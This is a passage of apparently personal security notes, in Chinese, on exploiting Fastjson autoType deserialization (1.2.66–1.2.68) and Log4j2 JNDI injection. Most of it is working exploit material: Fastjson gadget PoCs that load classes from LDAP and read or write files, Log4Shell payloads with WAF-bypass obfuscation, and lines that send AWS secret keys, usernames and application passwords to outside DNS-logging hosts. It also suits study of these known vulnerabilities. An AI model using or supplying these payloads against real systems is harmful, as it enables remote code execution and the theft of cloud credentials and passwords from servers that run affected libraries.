<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line">public class EXP_1266 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  </span><br><span class="line"> String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;;  </span><br><span class="line">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span><br><span class="line">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span><br><span class="line">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,&quot; +  </span><br><span class="line">//                &quot;\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;  </span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-67"><a href="#1-2-67" class="headerlink" title="1.2.67"></a>1.2.67</h3><ul>
<li>开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.67；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">import com.sun.xml.internal.ws.api.ha.StickyFeature;  </span><br><span class="line">  </span><br><span class="line">public class EXP_1267 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  </span><br><span class="line"> String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,&quot; +  </span><br><span class="line">                &quot; \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;;  </span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><ul>
<li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li>
</ul>
<p>先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class VulAutoCloseable implements AutoCloseable &#123;</span><br><span class="line">    public VulAutoCloseable(String cmd) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    public void close() throws Exception &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="exp代码"><a href="#exp代码" class="headerlink" title="exp代码"></a>exp代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.j4;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class EXP_1268 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String poc =&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.fj2.j4.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250218122403146.png?raw=true" alt="image-20250218122403146"></p>
<p><strong>这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断</strong>：</p>
<p><strong>小结：</strong>当传入checkAutoType()函数的expectClass参数不为null，并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中），就将需要加载的目标类当做是正常的类然后通过调用TypeUtils.loadClass()函数进行加载。</p>
<p>第一个 <code>@type</code> 进去什么都没有发生；但是第一个 <code>@type</code> 是作为第二个指定的类里面的 expectClass。所以说白了，loadClass 去作用的类是第一个 <code>@type</code>；如果这个 <code>@type</code> 是可控的恶意类，可以造成命令执行攻击。,关键代码如下👇</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250218123718382.png?raw=true" alt="image-20250218123718382"></p>
<p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;或&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>com.caucho.config.types.ResourceRef类PoC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h3><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><h5 id="利用类"><a href="#利用类" class="headerlink" title="利用类"></a>利用类</h5><p><strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p>
<h5 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.9.5&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;C:/Windows/win.ini&quot;, &quot;targetPath&quot;:&quot;D:/wamp64/www/win.txt&quot;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><p><strong>com.esotericsoftware.kryo.io.Output</strong></p>
<h5 id="依赖-1"><a href="#依赖-1" class="headerlink" title="依赖"></a>依赖</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;je&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.0.73&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>触发写文件操作则需要调用其flush()函数：</p>
<p>flush()函数只有在close()和require()函数被调用时才会触发，其中require()函数在调用write相关函数时会被触发。</p>
<p>JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其setBlockDataMode()函数中调用了drain()函数、drain()函数中又调用了out.write()函数</p>
<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;D:/wamp64/www/hacked.txt&quot;,</span><br><span class="line">        &quot;tempPath&quot;: &quot;D:/wamp64/www/test.txt&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;cHduZWQ=&quot;,</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="68往后增加了safeMode"><a href="#68往后增加了safeMode" class="headerlink" title="68往后增加了safeMode"></a>68往后增加了safeMode</h2><p>safeMode打开后，完全禁用autoType。所有的安全修复版本sec10也支持SafeMode配置。</p>
<h1 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h1><h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookup</span><br></pre></td></tr></table></figure>



<h2 id="基础复现代码"><a href="#基础复现代码" class="headerlink" title="基础复现代码"></a>基础复现代码</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.12&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p>看着有点像ssti，如下↓</p>
<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">import java.util.function.LongFunction;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main( String[] args )</span><br><span class="line">    &#123;</span><br><span class="line">        Logger logger = LogManager.getLogger(LongFunction.class);</span><br><span class="line">        logger.trace(&quot;trace level&quot;);</span><br><span class="line">        logger.debug(&quot;debug level&quot;);</span><br><span class="line">        logger.info(&quot;info level&quot;);</span><br><span class="line">        logger.warn(&quot;warn level&quot;);</span><br><span class="line">        logger.error(&quot;error level&quot;);</span><br><span class="line">        logger.fatal(&quot;fatal level&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="log4j2-xml"><a href="#log4j2-xml" class="headerlink" title="log4j2.xml"></a>log4j2.xml</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;configuration status=&quot;info&quot;&gt;</span><br><span class="line">    &lt;Properties&gt;</span><br><span class="line">        &lt;Property name=&quot;pattern1&quot;&gt;[%-5p] %d %c - %m%n&lt;/Property&gt;</span><br><span class="line">        &lt;Property name=&quot;pattern2&quot;&gt;</span><br><span class="line">            =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n</span><br><span class="line">        &lt;/Property&gt;</span><br><span class="line">        &lt;Property name=&quot;filePath&quot;&gt;logs/myLog.log&lt;/Property&gt;</span><br><span class="line">    &lt;/Properties&gt;</span><br><span class="line">    &lt;appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">        &lt;PatternLayout pattern=&quot;$&#123;pattern1&#125;&quot;/&gt;</span><br><span class="line">    &lt;/Console&gt; &lt;RollingFile name=&quot;RollingFile&quot; fileName=&quot;$&#123;filePath&#125;&quot;</span><br><span class="line">                            filePattern=&quot;logs/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log.gz&quot;&gt;</span><br><span class="line">        &lt;PatternLayout pattern=&quot;$&#123;pattern2&#125;&quot;/&gt;</span><br><span class="line">        &lt;SizeBasedTriggeringPolicy size=&quot;5 MB&quot;/&gt;</span><br><span class="line">    &lt;/RollingFile&gt;</span><br><span class="line">    &lt;/appenders&gt;</span><br><span class="line">    &lt;loggers&gt;</span><br><span class="line">        &lt;root level=&quot;info&quot;&gt;</span><br><span class="line">            &lt;appender-ref ref=&quot;Console&quot;/&gt;</span><br><span class="line">            &lt;appender-ref ref=&quot;RollingFile&quot;/&gt;</span><br><span class="line">        &lt;/root&gt;</span><br><span class="line">    &lt;/loggers&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞代码1"><a href="#漏洞代码1" class="headerlink" title="漏洞代码1"></a>漏洞代码1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">import java.util.function.LongFunction;</span><br><span class="line"></span><br><span class="line">public class RealEnv &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Logger logger = LogManager.getLogger(LongFunction.class);</span><br><span class="line"></span><br><span class="line">        String username = &quot;$&#123;java:os&#125;&quot;;</span><br><span class="line">        //String username = &quot;dddd&quot;;</span><br><span class="line">        if (username != null) &#123;</span><br><span class="line">            logger.info(&quot;User &#123;&#125; login in!&quot;, username);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            logger.error(&quot;User &#123;&#125; not exists&quot;, username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞代码利用2"><a href="#漏洞代码利用2" class="headerlink" title="漏洞代码利用2"></a>漏洞代码利用2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">import java.util.function.LongFunction;</span><br><span class="line"></span><br><span class="line">public class log4j2EXP &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Logger logger = LogManager.getLogger(LongFunction.class);</span><br><span class="line"></span><br><span class="line">        String username = &quot;$&#123;jndi:ldap://127.0.0.1:8085/sUWCwkzH&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        logger.info(&quot;User &#123;&#125; login in!&quot;, username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>没找到那个</p>
<p>PatternLayout的toSerializable()</p>
<p>断点调试一直进入就行，然后看到哪个缺包直接下载源码再全局搜索就行</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250221124213691.png?raw=true" alt="image-20250221124213691"></p>
<p>i&#x3D;7↓</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250221124311399.png?raw=true" alt="image-20250221124311399"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250221124602163.png?raw=true" alt="image-20250221124602163"></p>
<p>不写了，GitHub写的就挺好的</p>
<ul>
<li><code>resolver</code>解析时支持的关键词有<code>[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]</code>，而我们这里利用的<code>jndi:xxx</code>后续就会用到<code>JndiLookup</code>这个解析器</li>
<li>这里我们看到 <code>resolveVariable()</code> 方法里面是调用了 <code>lookup()</code> 方法，这个 <code>lookup()</code> 方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 ldap 服务的时候，是调用原生的 <code>lookup()</code> 方法的，是存在漏洞的。</li>
</ul>
<h4 id="简单waf绕过"><a href="#简单waf绕过" class="headerlink" title="简单waf绕过"></a>简单waf绕过</h4><h5 id="一"><a href="#一" class="headerlink" title="一"></a>一</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;</span><br></pre></td></tr></table></figure>

<h5 id="二"><a href="#二" class="headerlink" title="二"></a>二</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logg.info(&quot;$&#123;$&#123;lower:J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">logg.info(&quot;$&#123;$&#123;upper:j&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<h5 id="三"><a href="#三" class="headerlink" title="三"></a>三</h5><p>利用一些特殊字符的大小写转化的问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ı =&gt; upper =&gt; i (Java 中测试可行)</span><br><span class="line"></span><br><span class="line">ſ =&gt; upper =&gt; S (Java 中测试可行)</span><br><span class="line"></span><br><span class="line">İ =&gt; upper =&gt; i (Java 中测试不可行)</span><br><span class="line"></span><br><span class="line">K =&gt; upper =&gt; k (Java 中测试不可行)</span><br><span class="line"></span><br><span class="line">logg.error(&quot;$&#123;jnd$&#123;upper:ı&#125;:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="四"><a href="#四" class="headerlink" title="四"></a>四</h5><p>像 Jackson 和 fastjson 又有 unicode 和 hex 的编码特性，所以就可以尝试编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;\u0024\u007b&quot;&#125;</span><br><span class="line">&#123;&quot;key&quot;:&quot;\x24\u007b&quot;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="五"><a href="#五" class="headerlink" title="五"></a>五</h5><p>常规payload记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://123.56.226.71:1389/Test&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;a:-j&#125;ndi:ldap://br6orhfyoxobjsjbw436loft4kaayz.oastify.com/ExportObject&#125;;</span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;</span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;lower:jn&#125;di:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;</span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;</span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="六"><a href="#六" class="headerlink" title="六"></a>六</h5><p>读取系统密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;env:LOGNAME&#125;.1hj2a0litb8gvybwuy1m16vj8ae02p.oastify.com&#125;</span><br></pre></td></tr></table></figure>

<h3 id="获取点东西"><a href="#获取点东西" class="headerlink" title="获取点东西"></a>获取点东西</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">获取一些云主机的 Key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logg.error(&quot;$&#123;jndi:ldap://$&#123;env:AWS_SECRET_ACCESS_KEY&#125;.d0j226.dnslog.cn&#125;&quot;)</span><br><span class="line"></span><br><span class="line">可通过 env 来获取环境变量中的一些信息</span><br><span class="line">logg.error(&quot;$&#123;jndi:ldap://$&#123;env:USER&#125;.d0j226.dnslog.cn&#125;&quot;)</span><br><span class="line"></span><br><span class="line">logg.error(&quot;$&#123;jndi:ldap://$&#123;java:version&#125;.u2xf5m.dnslog.cn&#125;&quot;);</span><br><span class="line"></span><br><span class="line">外带密码</span><br><span class="line">$&#123;jndi:ldap://$&#123;bundle:application:spring.activemq.password&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

